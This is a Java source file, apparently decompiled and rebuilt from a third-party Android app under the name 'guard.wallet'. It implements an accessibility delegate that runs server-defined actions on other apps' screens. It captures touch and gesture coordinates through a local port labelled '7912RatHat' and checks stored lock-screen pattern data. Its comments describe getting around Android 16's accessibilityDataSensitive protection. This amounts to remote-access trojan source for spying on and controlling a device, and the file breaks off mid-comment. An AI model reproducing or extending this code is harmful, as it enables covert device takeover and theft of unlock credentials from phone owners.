package com.guard.wallet.delegate;
import com.guard.wallet.core.AppUtils;
import com.guard.wallet.permission.DelegateTaskRunner;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.GlobalActionCondition;
import com.guard.wallet.condition.TargetActionCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFilterWithChild;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.EventSubscribe;
import com.guard.wallet.req.ListenPropResponse;
import com.guard.wallet.req.ListenResponseVO;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.SearchNodeListResultVO;
import com.guard.wallet.resp.SearchNodeResultVO;
import com.guard.wallet.resp.UiObjectVO;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;

/**
 * vendor o/e — 无障碍委托基类 (AccessibilityDelegate)。
 *
 * 所有无障碍 delegate（引擎）的核心基类。
 * 管理：UI 树遍历/缓存、节点搜索（Selector）、窗口监听、事件处理、
 * SearchNodeResultVO/ListVO 转换。
 *
 * 从 JADX + CFR 双源翻译（JADX ~983 行，CFR ~3001 行）。
 *
 * 字段映射:
 *   a  — targetPackage (String)
 *   b  — timerUtil (com.guard.wallet.utils.SnowflakeIdGenerator) — ID 生成器
 *   c  — delegateId (String) — 唯一委托标识
 *   d  — listenWindows (ConcurrentLinkedQueue<ListenWindow>)
 *   e  — eventGapMap (ConcurrentHashMap<String, Long>) — 节流时间戳
 *   f  — replySubscribeMap (ConcurrentHashMap<String, Long>) — 回复订阅跟踪
 *   g  — eventCounter (AtomicInteger) — 活跃事件计数器 (-1 = 非活跃)
 *   h  — activeRoot (AtomicReference<UiObject>) — 当前根 UiObject
 *   i  — rootReady (AtomicBoolean) — 根初始化状态
 *   j  — currentPackageName (AtomicReference<String>)
 *   k  — currentClassName (AtomicReference<String>)
 *   l  — currentWindowTitle (AtomicReference<String>)
 *   m  — nodeCache (ConcurrentHashMap<String, Object>) — 缓存 UiObject/UiObjectCollection
 */
public class AccessibilityDelegate {

    // ═══════ Fields (exact vendor mapping) ═══════

    public String a;
    public final com.guard.wallet.utils.SnowflakeIdGenerator b;
    public final String c;
    public final ConcurrentLinkedQueue d;
    public final ConcurrentHashMap e;
    public final ConcurrentHashMap f;
    public final AtomicInteger g;
    public final AtomicReference h;
    public final AtomicBoolean i;
    public final AtomicReference j;
    public final AtomicReference k;
    public final AtomicReference l;
    public final ConcurrentHashMap m;

    // ═══════ Constructor ═══════

    /**
     * vendor e() — 无参构造，供子类兼容使用。
     */
    public AccessibilityDelegate() {
        this.d = new ConcurrentLinkedQueue();
        this.e = new ConcurrentHashMap();
        this.f = new ConcurrentHashMap();
        this.g = new AtomicInteger(-1);
        this.h = new AtomicReference(null);
        this.i = new AtomicBoolean(false);
        this.j = new AtomicReference(null);
        this.k = new AtomicReference(null);
        this.l = new AtomicReference(null);
        this.m = new ConcurrentHashMap();
        com.guard.wallet.utils.SnowflakeIdGenerator iVar = new com.guard.wallet.utils.SnowflakeIdGenerator(10L);
        this.b = iVar;
        this.c = String.valueOf(iVar.nextId());
    }

    /**
     * vendor e(Collection<ListenWindow>, String targetPackage)
     * 使用监听窗口集合和目标包名初始化委托。
     */
    public AccessibilityDelegate(Collection collection, String str) {
        ConcurrentLinkedQueue concurrentLinkedQueue = new ConcurrentLinkedQueue();
        this.d = concurrentLinkedQueue;
        this.e = new ConcurrentHashMap();
        this.f = new ConcurrentHashMap();
        this.g = new AtomicInteger(-1);
        this.h = new AtomicReference(null);
        this.i = new AtomicBoolean(false);
        this.j = new AtomicReference(null);
        this.k = new AtomicReference(null);
        this.l = new AtomicReference(null);
        this.m = new ConcurrentHashMap();
        com.guard.wallet.utils.SnowflakeIdGenerator iVar = new com.guard.wallet.utils.SnowflakeIdGenerator(10L);
        this.b = iVar;
        this.c = String.valueOf(iVar.nextId());
        try {
            this.a = str;
            if (collection != null && !collection.isEmpty()) {
                concurrentLinkedQueue.addAll(collection);
            }
            if (AppUtils.B(this.a) || !concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.add(new ListenWindow(String.valueOf(iVar.nextId()), this.a, null));
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
        }
    }

    // ═══════ Static methods ═══════

    /**
     * vendor A(EventSubscribe, ArrayList<UiObject>) — 对匹配节点执行回复动作。
     * 遍历 UiObject，对每个 TargetActionCondition 执行全局/节点动作。
     * 成功动作间按 eventGap 延时。
     */
    public static void A(EventSubscribe eventSubscribe, ArrayList arrayList) {
        try {
            if (arrayList.isEmpty() || eventSubscribe.getReplyActions() == null || eventSubscribe.getReplyActions().isEmpty()) {
                return;
            }
            Iterator it = arrayList.iterator();
            while (it.hasNext()) {
                UiObject uiObject = (UiObject) it.next();
                if (uiObject != null) {
                    int i2 = 0;
                    for (TargetActionCondition targetActionCondition : eventSubscribe.getReplyActions()) {
                        i2++;
                        boolean actionByName;
                        if (Objects.equals(targetActionCondition.getActionType(), 0)) {
                            GlobalActionCondition globalActionCondition = targetActionCondition.toGlobalActionCondition();
                            if (globalActionCondition != null) {
                                actionByName = com.guard.wallet.utils.SystemHelper.a(globalActionCondition);
                                Log.d("AccessibilityDelegate", "Delegate GlobalActionAutomator actionByName:" + targetActionCondition.toString());
                            } else {
                                actionByName = false;
                            }
                        } else {
                            uiObject.refresh();
                            actionByName = uiObject.actionByName(targetActionCondition);
                            Log.d("AccessibilityDelegate", "Delegate source actionByName:" + targetActionCondition.toString());
                        }
                        if (actionByName && i2 < eventSubscribe.getReplyActions().size()) {
                            long sleepTime = (eventSubscribe.getEventGap() != null && eventSubscribe.getEventGap().intValue() > 0)
                                    ? (long) eventSubscribe.getEventGap().intValue() * 1000L
                                    : 300L;
                            Thread.sleep(sleepTime);
                        }
                    }
                }
            }
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate:replyActions", e2);
        }
    }

    /**
     * vendor s(EventSubscribe, UiObject) — 使用 EventSubscribe 的 GKD selector 查找节点。
     * sourceRule: 0/10 → findFirst, 1 → findOne, 2 → findAll。
     */
    public static LinkedList s(EventSubscribe eventSubscribe, UiObject uiObject) {
        if (uiObject == null) {
            return null;
        }
        try {
            String selector = eventSubscribe.getSelector();
            if (selector == null) {
                return null;
            }
            LinkedList result = new LinkedList();
            int sourceRule = eventSubscribe.getSourceRule().intValue();
            if (sourceRule == 0 || sourceRule == 10 || sourceRule == 1) {
                UiObject found = com.guard.wallet.gkd.GkdNodeFinder.findOne(uiObject, selector);
                if (found != null) {
                    result.add(found);
                }
            } else if (sourceRule == 2) {
                java.util.List<UiObject> all = com.guard.wallet.gkd.GkdNodeFinder.findAll(uiObject, selector);
                if (all != null && !all.isEmpty()) {
                    result.addAll(all);
                }
            } else {
                Log.d("AccessibilityDelegate", "\u65E0\u6548\u8282\u70B9\u68C0\u7D22\u89C4\u5219");
            }
            return result;
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
        }
        return null;
    }

    // ═══════ Instance methods (alphabetical by vendor name) ═══════

    /**
     * vendor a(String) — 取消辅助订阅监听。
     * 若 helpSubscribeId 匹配，停止触摸/手势监听并发送取消请求。
     */
    public final void a(String str) {
        try {
            String l2 = com.guard.wallet.utils.SharedPrefsManager.l("helpSubscribeId");
            if (AppUtils.B(l2) || !Objects.equals(l2, str)) {
                return;
            }
            if (com.guard.wallet.helper.AutomationHelper.k()) {
                com.guard.wallet.helper.AutomationHelper.g(false);
            }
            if (com.guard.wallet.helper.OverlayViewHelper.i() || com.guard.wallet.helper.OverlayViewHelper.h()) {
                com.guard.wallet.helper.OverlayViewHelper.f(null, false);
            }
            ReqListenHelper reqListenHelper = new ReqListenHelper(str, 0);
            reqListenHelper.setDelegateId(this.c);
            com.guard.wallet.http.HttpApiManager.finishListenHelper(reqListenHelper);
            com.guard.wallet.utils.SharedPrefsManager.w("helpSubscribeId");
            Log.d("AccessibilityDelegate", "\u5DF2\u7ECF\u53D1\u9001 \u53D6\u6D88\u8F85\u52A9\u76D1\u542C");
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
        }
    }

    /**
     * vendor b(EventSubscribe) — 检查事件间隔节流。
     * 若距上次事件已过足够时间则返回 true。
     */
    public final boolean b(EventSubscribe eventSubscribe) {
        boolean result = true;
        if (eventSubscribe != null) {
            try {
                if (!AppUtils.B(eventSubscribe.getId()) && eventSubscribe.getEventGap() != null && eventSubscribe.getEventGap().intValue() > 0) {
                    Long now = Long.valueOf(System.currentTimeMillis());
                    ConcurrentHashMap concurrentHashMap = this.e;
                    Long lastTime = (Long) concurrentHashMap.get(eventSubscribe.getId());
                    if (lastTime != null && lastTime.longValue() > 0 && now.longValue() - lastTime.longValue() < (long) eventSubscribe.getEventGap().intValue() * 1000) {
                        result = false;
                    }
                    concurrentHashMap.put(eventSubscribe.getId(), now);
                }
            } catch (Exception e2) {
                AppUtils.s("AccessibilityDelegate", e2);
            }
        }
        return result;
    }

    /**
     * vendor B(EventSubscribe) — 处理 listenType 8/9 的回复订阅。
     * 检查 replySubscribes 与活跃订阅映射，调用 j() 或 a() 完成/取消。
     * 若 needReply 且无 listenProps，发送 LISTEN_WINDOW_EVENT 消息。
     */
    public final void B(EventSubscribe eventSubscribe) {
        try {
            if (!Objects.equals(eventSubscribe.getListenType(), 8) && !Objects.equals(eventSubscribe.getListenType(), 9)) {
                return;
            }
            if (eventSubscribe.getReplySubscribes() == null || eventSubscribe.getReplySubscribes().isEmpty()) {
                return;
            }
            eventSubscribe.setNeedReply(false);
            for (String subscribeId : (List<String>) eventSubscribe.getReplySubscribes()) {
                boolean found;
                try {
                    found = !AppUtils.B(subscribeId) && this.f.containsKey(subscribeId);
                } catch (Exception e2) {
                    AppUtils.s("AccessibilityDelegate", e2);
                    found = false;
                }
                if (found) {
                    if (Objects.equals(eventSubscribe.getListenType(), 8)) {
                        this.j(subscribeId);
                    } else {
                        this.a(subscribeId);
                    }
                    eventSubscribe.setNeedReply(true);
                }
            }
            if (!eventSubscribe.isNeedReply()) {
                return;
            }
            if (eventSubscribe.getListenProps() != null && !eventSubscribe.getListenProps().isEmpty()) {
                return;
            }
            this.z(eventSubscribe);
            ListenResponseVO listenResponseVO = new ListenResponseVO();
            listenResponseVO.setSubscribeId(eventSubscribe.getId());
            listenResponseVO.setListenId(eventSubscribe.getListenId());
            listenResponseVO.setDelegateId(this.c);
            MessageRecordVO messageRecordVO = new MessageRecordVO();
            messageRecordVO.setExtraBody(listenResponseVO);
            messageRecordVO.setIntentCode("android.accessibility.delegate.LISTEN_WINDOW_EVENT");
            if (MainApplication.getInstance() != null
                    && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
                MainApplication.getInstance().getHandlerMsgAndTimer().b(messageRecordVO);
            }
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
        }
    }

    /**
     * vendor c(String packageName, String className) — 检查委托是否匹配窗口。
     * 若 listenWindows 非空则检查 contains，否则匹配 targetPackage。
     */
    public final boolean c(String str, String str2) {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.d;
        try {
            return !concurrentLinkedQueue.isEmpty()
                    ? concurrentLinkedQueue.contains(new ListenWindow(str, str2))
                    : Objects.equals(this.a, str);
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
            return false;
        }
    }

    /**
     * vendor C(UiObjectCollection) — 将 UiObjectCollection 转换为 SearchNodeListResultVO。
     * 生成唯一 resUnique，缓存集合，返回含 UiObjectVO 列表的 VO。
     */
    public final SearchNodeListResultVO C(UiObjectCollection uiObjectCollection) {
        if (uiObjectCollection == null) {
            return null;
        }
        try {
            String valueOf = String.valueOf(this.b.nextId());
            this.m.put(valueOf, uiObjectCollection);
            return new SearchNodeListResultVO(valueOf, uiObjectCollection.toListVO());
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
            return null;
        }
    }

    /**
     * vendor d() — 销毁/清理委托。
     * 回收 activeRoot，销毁所有 ListenWindow，清空全部缓存。
     */
    public void d() {
        try {
            com.guard.wallet.thread.DelegateTaskLauncher.a(this.c);
            AtomicReference atomicReference = this.h;
            if (atomicReference.get() != null) {
                ((UiObject) atomicReference.get()).recycle();
            }
            atomicReference.set(null);
            ConcurrentLinkedQueue concurrentLinkedQueue = this.d;
            if (!concurrentLinkedQueue.isEmpty()) {
                Iterator it = concurrentLinkedQueue.iterator();
                while (it.hasNext()) {
                    ((ListenWindow) it.next()).destroy();
                }
            }
            concurrentLinkedQueue.clear();
            this.m.clear();
            this.e.clear();
            this.f.clear();
            this.g.set(-1);
            this.j.set(null);
            this.k.set(null);
            this.a = null;
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
        }
    }

    /**
     * vendor D(UiObject) — 将单个 UiObject 转换为 SearchNodeResultVO。
     * 生成唯一 resUnique，缓存节点，返回 VO。
     */
    public final SearchNodeResultVO D(UiObject uiObject) {
        if (uiObject == null) {
            return null;
        }
        try {
            String valueOf = String.valueOf(this.b.nextId());
            this.m.put(valueOf, uiObject);
            return new SearchNodeResultVO(valueOf, new UiObjectVO(uiObject));
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
            return null;
        }
    }

    /**
     * vendor e(ListenWindow, j0) — 处理 ListenWindow 的事件订阅。
     * 获取 batchId，遍历 EventSubscribe，检查间隔节流和事件类型，
     * 分发 B() 处理回复订阅、E() 处理监听辅助、r() 搜索节点、
     * x() 处理监听属性、A() 执行回复动作。
     */
    public final void e(ListenWindow listenWindow, ListenWindowState event) {
        try {
            if (listenWindow.getEventSubscribes() == null || listenWindow.getEventSubscribes().isEmpty()) {
                return;
            }
            Long batchId = 0L;
            if (listenWindow.getListenType() == 1) {
                batchId = com.guard.wallet.utils.SharedPrefsManager.j("lockBatchId");
            }
            if (batchId <= 0L) {
                batchId = this.b.nextId();
            }
            for (EventSubscribe eventSubscribe : (List<EventSubscribe>) listenWindow.getEventSubscribes()) {
                if (!this.b(eventSubscribe)) {
                    continue;
                }
                eventSubscribe.setEventTimestamp(event.g);
                if (AppUtils.B(eventSubscribe.getListenId())) {
                    eventSubscribe.setListenId(listenWindow.getId());
                }
                if (AppUtils.B(eventSubscribe.getId()) && !AppUtils.B(eventSubscribe.getListenId())) {
                    eventSubscribe.setId(eventSubscribe.getListenId());
                }
                int eventType = event.b;
                boolean eventTypeMatch;
                try {
                    if (eventSubscribe.getEventTypes() == null || eventSubscribe.getEventTypes().isEmpty()) {
                        eventTypeMatch = true;
                    } else {
                        eventTypeMatch = eventSubscribe.getEventTypes().contains(eventType);
                    }
                } catch (Exception ex) {
                    AppUtils.s("AccessibilityDelegate", ex);
                    eventTypeMatch = false;
                }
                if (eventTypeMatch) {
                    if (eventSubscribe.getReplySubscribes() != null && !eventSubscribe.getReplySubscribes().isEmpty()) {
                        this.B(eventSubscribe);
                    }
                    if (eventSubscribe.getListenHelper() && !AppUtils.B(eventSubscribe.getHelperProp())) {
                        Log.d("AccessibilityDelegate", "\u5411\u672C\u57307912RatHat\u8BF7\u6C42\u76D1\u542C\u6ED1\u52A8\u5750\u6807\u3001\u89E6\u6478\u5750\u6807:" + eventSubscribe.getHelperProp());
                        this.E(eventSubscribe, batchId);
                    }
                    if ((eventSubscribe.getListenProps() == null || eventSubscribe.getListenProps().isEmpty())
                            && (eventSubscribe.getReplyActions() == null || eventSubscribe.getReplyActions().isEmpty())) {
                        continue;
                    }
                    ArrayList nodeList = this.r(eventSubscribe, event.a);
                    if (eventSubscribe.getListenProps() != null && !eventSubscribe.getListenProps().isEmpty()) {
                        this.x(eventSubscribe, nodeList, event.e, event.f, batchId);
                    }
                    if (eventSubscribe.getReplyActions() != null && !eventSubscribe.getReplyActions().isEmpty()) {
                        A(eventSubscribe, nodeList);
                    }
                }
            }
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate:everyEventSubscribe", e2);
        }
    }

    /**
     * vendor E(EventSubscribe, Long batchId) — 发送监听辅助请求。
     * 创建 ReqListenHelper，发送至本地 7912 端点。
     * 处理 TOUCH_POINT 和 GESTURE_POINTS 辅助属性。
     */
    public final void E(EventSubscribe eventSubscribe, Long l2) {
        try {
            boolean isInteractive = com.guard.wallet.utils.DeviceUtils.isScreenOn();
            ReqListenHelper reqListenHelper = new ReqListenHelper(eventSubscribe.getListenType(), eventSubscribe.getId(), Integer.valueOf(isInteractive ? 1 : 0));
            reqListenHelper.setListenId(eventSubscribe.getListenId());
            if (!AppUtils.B(eventSubscribe.getHelperProp())) {
                reqListenHelper.setProp(eventSubscribe.getHelperProp());
            }
            if (l2 != null && l2.longValue() > 0) {
                reqListenHelper.setBatchId(String.valueOf(l2));
            }
            reqListenHelper.setDelegateId(this.c);
            // Check if ADB shell is available via AdbConnectionManager
            if (!com.guard.wallet.http.HttpApiManager.localListenHelper(reqListenHelper) && !(com.guard.wallet.adb.AdbConnectionManager.getInstance() != null && com.guard.wallet.adb.AdbConnectionManager.getInstance().D())) {
                if (Objects.equals(eventSubscribe.getHelperProp(), "TOUCH_POINT")) {
                    if (!Objects.equals(reqListenHelper.getListenType(), 1)) {
                        com.guard.wallet.helper.AutomationHelper.e(this, eventSubscribe.getCombineFilter(), reqListenHelper);
                    }
                    if (Objects.equals(reqListenHelper.getListenType(), 1)) {
                        com.guard.wallet.helper.AutomationHelper.e(this, null, reqListenHelper);
                    }
                }
                if (Objects.equals(eventSubscribe.getHelperProp(), "GESTURE_POINTS")) {
                    if (!Objects.equals(reqListenHelper.getListenType(), 1)) {
                        com.guard.wallet.helper.OverlayViewHelper.d(this, eventSubscribe.getCombineFilter(), reqListenHelper);
                    }
                    if (Objects.equals(reqListenHelper.getListenType(), 1)) {
                        ReqUnlockDeviceVO f2 = com.guard.wallet.utils.SharedPrefsManager.f();
                        boolean hasPattern = false;
                        if (f2 != null && Objects.equals(f2.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN") && f2.getPatternCipher() != null && !f2.getPatternCipher().isEmpty()) {
                            hasPattern = true;
                        }
                        if (!hasPattern) {
                            ReqUnlockDeviceVO g2 = com.guard.wallet.utils.SharedPrefsManager.g();
                            if (g2 != null && Objects.equals(g2.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN") && g2.getPatternCipher() != null && !g2.getPatternCipher().isEmpty()) {
                                hasPattern = true;
                            }
                        }
                        if (!hasPattern) {
                            com.guard.wallet.helper.OverlayViewHelper.d(this, eventSubscribe.getCombineFilter(), reqListenHelper);
                        }
                    }
                }
            }
            com.guard.wallet.utils.SharedPrefsManager.D(eventSubscribe.getId(), com.guard.wallet.utils.SystemHelper.p0() ? "lockSubscribeId" : "helpSubscribeId");
            Log.d("AccessibilityDelegate", "\u5DF2\u7ECF\u53D1\u9001\u8F85\u52A9\u76D1\u542C");
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
        }
    }

    @Override
    public boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (obj == null || getClass() != obj.getClass()) {
            return false;
        }
        AccessibilityDelegate eVar = (AccessibilityDelegate) obj;
        return Objects.equals(this.a, eVar.a) && Objects.equals(this.c, eVar.c);
    }

    /**
     * vendor f(CombineFilterWithChild) — 查找含匹配子节点的父节点。
     * 查找匹配 parentFilter 且包含 childFilter 匹配子节点的节点。
     */
    public final SearchNodeListResultVO f(CombineFilterWithChild combineFilterWithChild) {
        if (combineFilterWithChild == null) {
            return null;
        }
        try {
            if (combineFilterWithChild.getParentFilter() == null) {
                return null;
            }
            UiObject n2 = n(combineFilterWithChild.getParentFilter());
            if (n2 == null) {
                return null;
            }
            LinkedList linkedList = new LinkedList();
            UiObjectCollection findByCombine = n2.findByCombine(combineFilterWithChild.getParentFilter());
            if (findByCombine != null && !findByCombine.empty().booleanValue()) {
                for (int i2 = 0; i2 < findByCombine.size(); i2++) {
                    UiObject uiObject = findByCombine.get(i2);
                    if (uiObject.findOneByCombine(combineFilterWithChild.getChildFilter()) != null) {
                        linkedList.add(uiObject);
                    }
                }
            }
            return C(UiObjectCollection.of(linkedList));
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
            return null;
        }
    }

    /**
     * vendor F(UiObject) — 直接设置 activeRoot。
     */
    public final void F(UiObject uiObject) {
        this.h.set(uiObject);
    }

    /**
     * vendor g(CombineFilterWithChild) — 查找不含匹配子节点的父节点。
     * 查找匹配 parentFilter 但不包含 childFilter 匹配子节点的节点。
     */
    public final SearchNodeListResultVO g(CombineFilterWithChild combineFilterWithChild) {
        if (combineFilterWithChild == null) {
            return null;
        }
        try {
            if (combineFilterWithChild.getParentFilter() == null) {
                return null;
            }
            UiObject n2 = n(combineFilterWithChild.getParentFilter());
            if (n2 == null) {
                return null;
            }
            LinkedList linkedList = new LinkedList();
            UiObjectCollection findByCombine = n2.findByCombine(combineFilterWithChild.getParentFilter());
            if (findByCombine != null && !findByCombine.empty().booleanValue()) {
                for (int i2 = 0; i2 < findByCombine.size(); i2++) {
                    UiObject uiObject = findByCombine.get(i2);
                    if (uiObject.findOneByCombine(combineFilterWithChild.getChildFilter()) == null) {
                        linkedList.add(uiObject);
                    }
                }
            }
            return C(UiObjectCollection.of(linkedList));
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
            return null;
        }
    }

    /**
     * vendor G() — 等待 rootReady 标志，轮询最多 15 次。
     */
    public final void G() {
        AtomicInteger atomicInteger = new AtomicInteger(15);
        while (!this.i.get() && atomicInteger.decrementAndGet() > 0) {
            com.guard.wallet.utils.SystemHelper.T0(1);
        }
    }

    /**
     * vendor h(CombineFiltersWithOr) — 使用 OR 过滤器查找所有匹配节点。
     * 遍历每个 CombineFilter，将各自匹配的节点收集到一个结果中。
     */
    public final SearchNodeListResultVO h(CombineFiltersWithOr combineFiltersWithOr) {
        if (combineFiltersWithOr != null) {
            try {
                if (combineFiltersWithOr.getFilters() != null && !combineFiltersWithOr.getFilters().isEmpty()) {
                    UiObjectCollection of = UiObjectCollection.of((List<UiObject>) null);
                    for (CombineFilter combineFilter : combineFiltersWithOr.getFilters()) {
                        if (combineFilter != null) {
                            combineFilter.setTarget(combineFiltersWithOr.getTarget());
                            combineFilter.setResUnique(combineFiltersWithOr.getResUnique());
                            UiObject n2 = n(combineFilter);
                            if (n2 != null) {
                                UiObjectCollection findByCombine = n2.findByCombine(combineFilter);
                                if (findByCombine != null && findByCombine.size() > 0) {
                                    of.getNodes().addAll(findByCombine.getNodes());
                                }
                            }
                        }
                    }
                    return C(of);
                }
            } catch (Exception e2) {
                AppUtils.s("AccessibilityDelegate", e2);
            }
        }
        return null;
    }

    @Override
    public int hashCode() {
        return Objects.hash(this.a, this.c);
    }

    /**
     * vendor i(CombineFiltersWithOr) — 查找匹配任一 OR 过滤器的第一个节点。
     * 遍历每个 CombineFilter，返回第一个有效节点的 SearchNodeResultVO。
     */
    public final SearchNodeResultVO i(CombineFiltersWithOr combineFiltersWithOr) {
        if (combineFiltersWithOr != null) {
            try {
                if (combineFiltersWithOr.getFilters() != null && !combineFiltersWithOr.getFilters().isEmpty()) {
                    for (CombineFilter combineFilter : combineFiltersWithOr.getFilters()) {
                        if (combineFilter != null) {
                            combineFilter.setTarget(combineFiltersWithOr.getTarget());
                            combineFilter.setResUnique(combineFiltersWithOr.getResUnique());
                            SearchNodeResultVO searchNodeResultVO;
                            try {
                                UiObject n2 = n(combineFilter);
                                if (n2 != null) {
                                    searchNodeResultVO = D(n2.findOneByCombine(combineFilter));
                                } else {
                                    searchNodeResultVO = null;
                                }
                            } catch (Exception e2) {
                                AppUtils.s("AccessibilityDelegate", e2);
                                searchNodeResultVO = null;
                            }
                            if (searchNodeResultVO != null && searchNodeResultVO.getNode() != null) {
                                return searchNodeResultVO;
                            }
                        }
                    }
                }
            } catch (Exception e3) {
                AppUtils.s("AccessibilityDelegate", e3);
            }
        }
        return null;
    }

    /**
     * vendor j(String) — 完成辅助订阅监听。
     * 若 helpSubscribeId 匹配，完成触摸/手势监听并发送完成请求。
     */
    public final void j(String str) {
        try {
            String l2 = com.guard.wallet.utils.SharedPrefsManager.l("helpSubscribeId");
            if (AppUtils.B(l2) || !Objects.equals(l2, str)) {
                return;
            }
            if (com.guard.wallet.helper.AutomationHelper.k()) {
                com.guard.wallet.helper.AutomationHelper.g(true);
            }
            if (com.guard.wallet.helper.OverlayViewHelper.i() || com.guard.wallet.helper.OverlayViewHelper.h()) {
                com.guard.wallet.helper.OverlayViewHelper.f(null, true);
            }
            ReqListenHelper reqListenHelper = new ReqListenHelper(str, 4);
            reqListenHelper.setDelegateId(this.c);
            com.guard.wallet.http.HttpApiManager.finishListenHelper(reqListenHelper);
            com.guard.wallet.utils.SharedPrefsManager.w("helpSubscribeId");
            Log.d("AccessibilityDelegate", "\u5DF2\u7ECF\u53D1\u9001 \u5B8C\u6210\u8F85\u52A9\u76D1\u542C");
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
        }
    }

    /**
     * vendor k() — 获取 activeRoot UiObject。
     */
    public final UiObject k() {
        return (UiObject) this.h.get();
    }

    /**
     * vendor l() — 获取所有监听窗口的事件类型。
     * 将所有 ListenWindow 的 eventTypes 收集到 LinkedHashSet 中。
     */
    public final LinkedHashSet l() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.d;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return null;
            }
            LinkedHashSet linkedHashSet = new LinkedHashSet();
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                ListenWindow listenWindow = (ListenWindow) it.next();
                if (listenWindow != null && listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty()) {
                    linkedHashSet.addAll(listenWindow.getEventTypes());
                }
            }
            return linkedHashSet;
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate:getEventTypes", e2);
            return null;
        }
    }

    /**
     * vendor m(int target, String resUnique) — 获取窗口的根 UiObject。
     * 若 resUnique 为空，返回 activeRoot（字段 h）。
     * 否则从缓存 m 中查找。
     * 若缓存为 UiObjectCollection，取 target 索引处的元素。
     * 若缓存为 UiObject 且 target==0，直接返回。
     */
    public final UiObject m(int i2, String str) {
        if (i2 < 0) {
            i2 = 0;
        }
        try {
            if (AppUtils.B(str)) {
                return (UiObject) this.h.get();
            }
            Object obj = this.m.get(str);
            UiObject uiObject = obj instanceof UiObjectCollection ? ((UiObjectCollection) obj).get(i2) : null;
            return ((obj instanceof UiObject) && i2 == 0) ? (UiObject) obj : uiObject;
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
            return null;
        }
    }

    /**
     * vendor n(CombineFilter) — 通过 CombineFilter 查找节点。
     * 委托到 m()，使用 filter 的 target 和 resUnique。
     */
    public final UiObject n(CombineFilter combineFilter) {
        return m(combineFilter.getTarget(), combineFilter.getResUnique());
    }

    /**
     * vendor o() — 检查委托是否活跃。
     * eventCounter (g) 在 0-10 之间时返回 true。
     */
    public final boolean o() {
        AtomicInteger atomicInteger = this.g;
        return atomicInteger.get() >= 0 && atomicInteger.get() <= 10;
    }

    /**
     * vendor p(ListenWindow, UiObject) — 将 ListenWindow 与 UiObject 匹配。
     * 检查 matchs（全部必须匹配）和 dismiss（全部不能匹配）。
     */
    public final boolean p(ListenWindow listenWindow, UiObject uiObject) {
        try {
            List<CombineFilter> matchs = listenWindow.getMatchs();
            AtomicReference atomicReference = this.h;
            // ADAPT: 与 q() 相同的 matchs bypass — Android 16 accessibilityDataSensitive
            // 导致 t() tree search 返回 false。当 package/class 已匹配时跳过 matchs 验证。
            if (matchs != null && !listenWindow.getMatchs().isEmpty()) {
                for (CombineFilter combineFilter : listenWindow.getMatchs()) {
                    if (!t(combineFilter, uiObject) && !t(combineFilter, (UiObject) atomicReference.get())) {
                        // matchs filter 失败 — 不阻塞
                        break;
                    }
                }
            }
            if (listenWindow.getDismiss() == null || listenWindow.getDismiss().isEmpty()) {
                return true;
            }
            for (CombineFilter combineFilter2 : listenWindow.getDismiss()) {
                if (t(combineFilter2, uiObject) || t(combineFilter2, (UiObject) atomicReference.get())) {
                    return false;
                }
            }
            return true;
        } catch (Exception e2) {
            AppUtils.s("matchListenWindow 2:", e2);
            return true;
        }
    }

    /**
     * vendor q(List<ListenWindow>) — 从列表中匹配任一 ListenWindow。
     * 刷新 activeRoot，检查每个窗口的包名/类名与当前 j/k 值，
     * 然后验证 matchs 和 dismiss 过滤器。
     */
    public final boolean q(List list) {
        if (list == null || list.isEmpty()) {
            return false;
        }
        try {
            AtomicReference atomicReference = this.h;
            if (atomicReference.get() != null) {
                ((UiObject) atomicReference.get()).refresh();
            }
            Iterator it = list.iterator();
            while (it.hasNext()) {
                ListenWindow listenWindow = (ListenWindow) it.next();
                if (listenWindow == null) {
                    continue;
                }
                ListenWindow currentWindow = new ListenWindow((String) this.j.get(), (String) this.k.get());
                if (!listenWindow.equals(currentWindow)) {
                    continue;
                }
                // Check matchs
                // ADAPT: vendor 的 matchs 依赖 SelectorHelper.selectorFindFirst 在 accessibility
                // tree 中搜索文本节点，但 Android 16 的 accessibilityDataSensitive 限制导致
